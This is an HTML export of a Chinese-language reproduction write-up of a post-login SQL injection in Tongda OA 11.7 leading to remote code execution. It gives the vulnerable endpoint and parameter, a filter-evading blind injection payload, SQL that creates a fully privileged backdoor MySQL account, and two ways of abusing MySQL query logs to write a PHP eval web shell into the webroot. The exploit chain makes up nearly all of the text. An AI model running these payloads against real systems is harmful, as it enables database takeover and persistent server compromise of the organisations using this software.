<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="通达oa-117-后台sql注入漏洞rce"><span class="csECDA2D3">通达</span><span class="csDE05BCC">oa 11.7 </span><span class="csECDA2D3">后台</span><span class="csDE05BCC">sql</span><span class="csECDA2D3">注入漏洞</span><span class="csDE05BCC">&amp;rce</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h3 class="cs868C439D">
			<a name="利用条件"><span class="csD6CA00D2">利用条件：</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">需要登陆后台</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">通达</span><span class="cs8926E06">oa 11.7</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">注入出现在</span><span class="cs9FB05234">general/hr/manage/query/delete_cascade.php</span><span class="cs9C1B1871">文件中，代码实现如下：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%2011.7%20%e5%90%8e%e5%8f%b0sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e&rce_files/image0.png" width="560" height="282" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">首先判断</span><span class="cs9FB05234">$condition_cascade</span><span class="cs9C1B1871">是否为空，如果不为空，则将其中的</span><span class="cs8926E06">&#39;</span><span class="cs9C1B1871">替换为</span><span class="cs8926E06">&#39;</span><span class="cs9C1B1871">。为什么要这样替换呢，主要是因为</span><span class="cs8926E06">V11.7</span><span class="cs9C1B1871">版本中，注册变量时考虑了安全问题，将用户输入的字符用</span><span class="cs8926E06">addslashes</span><span class="cs9C1B1871">函数进行保护，如下：</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">inc/common.inc.php</span><span class="cs9C1B1871">代码</span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%2011.7%20%e5%90%8e%e5%8f%b0sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e&rce_files/image1.png" width="560" height="189" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">因为是无回显机制，是盲注，所以尝试</span><span class="cs8926E06">(select 1 from (select sleep(5))a)</span><span class="cs9C1B1871">，结果没那么简单：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%2011.7%20%e5%90%8e%e5%8f%b0sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e&rce_files/image2.png" width="560" height="88" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">触发了通达</span><span class="cs8926E06">OA</span><span class="cs9C1B1871">的过滤机制，翻看代码，在</span><span class="cs9FB05234">inc/conn.php</span><span class="cs9C1B1871">文件中找到过滤机制如下</span><span class="cs8926E06">:</span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%2011.7%20%e5%90%8e%e5%8f%b0sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e&rce_files/image3.png" width="560" height="259" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">其过滤了一些字符，但是并非无法绕过，盲注的核心是：</span><span class="cs8926E06">substr</span><span class="cs9C1B1871">、</span><span class="cs8926E06">if</span><span class="cs9C1B1871">等函数，均未被过滤，所以还是有机会的。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">传入错误的</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">语句时，页面出错：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%2011.7%20%e5%90%8e%e5%8f%b0sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e&rce_files/image4.png" width="560" height="101" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">那么只要构造</span><span class="cs8926E06">MySQL</span><span class="cs9C1B1871">报错即可配合</span><span class="cs8926E06">if</span><span class="cs9C1B1871">函数进行盲注了，翻看局外人师傅在补天白帽大会上的分享，发现</span><span class="cs9FB05234">power(9999,99)</span><span class="cs9C1B1871">也可以使数据库报错，所以构造语句：</span></p><p class="cs3A447A38"><span class="cs9FB05234">select if((substr(user(),1,1)=&#39;r&#39;),1,power(9999,99)) # </span><span class="cs7FFD2630">当字符相等时，不报错，错误时报错</span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%2011.7%20%e5%90%8e%e5%8f%b0sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e&rce_files/image5.png" width="560" height="122" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%2011.7%20%e5%90%8e%e5%8f%b0sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e&rce_files/image6.png" width="560" height="95" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="构造利用链"><span class="csD6CA00D2">构造利用链</span></a></h3>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">添加用户：</span></p><p class="cs3A447A38"><span class="cs9FB05234">grant all privileges ON mysql.* TO &#39;at666&#39;@&#39;%&#39; IDENTIFIED BY &#39;abcABC@123&#39; WITH GRANT OPTION</span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%2011.7%20%e5%90%8e%e5%8f%b0sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e&rce_files/image7.png" width="560" height="275" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%2011.7%20%e5%90%8e%e5%8f%b0sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e&rce_files/image8.png" width="560" height="151" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后该用户是对</span><span class="cs8926E06">mysql</span><span class="cs9C1B1871">数据库拥有所有权限的</span><span class="cs8926E06">,</span><span class="cs9C1B1871">然后给自己加权限：</span></p><p class="cs3A447A38"><span class="cs9FB05234">UPDATE `mysql`.`user` SET `Password` = &#39;*DE0742FA79F6754E99FDB9C8D2911226A5A9051D&#39;, `Select_priv` = &#39;Y&#39;, `Insert_priv` = &#39;Y&#39;, `Update_priv` = &#39;Y&#39;, `Delete_priv` = &#39;Y&#39;, `Create_priv` = &#39;Y&#39;, `Drop_priv` = &#39;Y&#39;, `Reload_priv` = &#39;Y&#39;, `Shutdown_priv` = &#39;Y&#39;, `Process_priv` = &#39;Y&#39;, `File_priv` = &#39;Y&#39;, `Grant_priv` = &#39;Y&#39;, `References_priv` = &#39;Y&#39;, `Index_priv` = &#39;Y&#39;, `Alter_priv` = &#39;Y&#39;, `Show_db_priv` = &#39;Y&#39;, `Super_priv` = &#39;Y&#39;, `Create_tmp_table_priv` = &#39;Y&#39;, `Lock_tables_priv` = &#39;Y&#39;, `Execute_priv` = &#39;Y&#39;, `Repl_slave_priv` = &#39;Y&#39;, `Repl_client_priv` = &#39;Y&#39;, `Create_view_priv` = &#39;Y&#39;, `Show_view_priv` = &#39;Y&#39;, `Create_routine_priv` = &#39;Y&#39;, `Alter_routine_priv` = &#39;Y&#39;, `Create_user_priv` = &#39;Y&#39;, `Event_priv` = &#39;Y&#39;, `Trigger_priv` = &#39;Y&#39;, `Create_tablespace_priv` = &#39;Y&#39;, `ssl_type` = &#39;&#39;, `ssl_cipher` = &#39;&#39;, `x509_issuer` = &#39;&#39;, `x509_subject` = &#39;&#39;, `max_questions` = 0, `max_updates` = 0, `max_connections` = 0, `max_user_connections` = 0, `plugin` = &#39;mysql_native_password&#39;, `authentication_string` = &#39;&#39;, `password_expired` = &#39;Y&#39; WHERE `Host` = Cast(&#39;%&#39; AS Binary(1)) AND `User` = Cast(&#39;at666&#39; AS Binary(5));</span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%2011.7%20%e5%90%8e%e5%8f%b0sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e&rce_files/image9.png" width="560" height="229" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后用注入点刷新权限，因为该用户是没有刷新权限的权限的：</span><span class="cs9FB05234">general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;</span><span class="cs9C1B1871">这样就拥有了所有权限。再次登录：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%2011.7%20%e5%90%8e%e5%8f%b0sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e&rce_files/image10.png" width="560" height="161" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">提示这个，或者让改密码死活改不了。再执行一下</span></p><p class="cs3A447A38"><span class="cs9FB05234">grant all privileges ON mysql.* TO &#39;at666&#39;@&#39;%&#39; IDENTIFIED BY &#39;abcABC@123&#39; WITH GRANT OPTION</span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%2011.7%20%e5%90%8e%e5%8f%b0sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e&rce_files/image11.png" width="560" height="261" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="写shell"><span class="csD6CA00D2">写</span><span class="csD1E291E2">shell</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234"># </span><span class="cs7FFD2630">查路径：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">select @@basedir; # c:\td0a117\mysql5\</span><span class="cs7FFD2630">，那么</span><span class="cs9FB05234">web</span><span class="cs7FFD2630">目录就是</span><span class="cs9FB05234">c:\td0a117\webroot\</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">方法</span><span class="cs9FB05234">1</span><span class="cs7FFD2630">：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">set global slow_query_log=on;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">set global slow_query_log_file=&#39;C:/td0a117/webroot/tony.php&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">select &#39;&lt;?php eval($_POST[x]);?&gt;&#39; or sleep(11);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">方法</span><span class="cs9FB05234">2</span><span class="cs7FFD2630">：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">set global general_log = on;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">set global general_log_file = &#39;C:/td0a117/webroot/tony2.php&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">select &#39;&lt;?php eval($_POST[x]);?&gt;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">show variables like &#39;%general%&#39;;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%2011.7%20%e5%90%8e%e5%8f%b0sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e&rce_files/image12.png" width="560" height="345" alt="" style="border-width:0px;" /></span></p></body>
</html>
